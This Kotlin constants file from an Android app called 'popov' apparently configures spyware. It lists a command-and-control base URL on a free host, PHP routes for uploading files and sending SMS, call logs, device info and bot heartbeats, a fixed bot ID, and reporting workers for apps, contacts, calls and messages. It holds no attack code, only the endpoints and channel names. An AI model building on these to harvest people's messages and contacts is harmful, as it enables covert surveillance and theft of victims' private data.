package com.github.yohannestz.popov.util

object Constants {
    //base urls
    const val BASE_URL = "https://popov-backend.onrender.com/popov/"
    const val PHP_BASE_URL = "https://sleeping-dragon.000webhostapp.com/popov/"

    //routes
    const val FILE_UPLOAD_ROUTE = "popov.php"
    const val GET_SMS_ROUTE = "getSms.php"
    const val GET_CALLS_ROUTE = "getCalls.php"
    const val SEND_DEVICE_INFO_ROUTE = "sendDeviceInfo.php"
    const val SEND_CALLS_ROUTE = "sendCalls.php"
    const val SEND_SMS_ROUTE = "sendSms.php"
    const val SEND_HEARTBEAT_ROUTE = "botHeartBeat.php"


    const val BOT_ID = "XS556"

    const val APPS_LOG_REPORT_WORKER = "apps_log_report_worker"
    const val CONTACTS_LOG_REPORT_WORKER = "contacts_log_report_worker"
    const val CALLS_LOG_REPORT_WORKER = "calls_log_report_worker"
    const val MESSAGES_LOG_REPORT_WORKER = "messages_log_report_worker"
}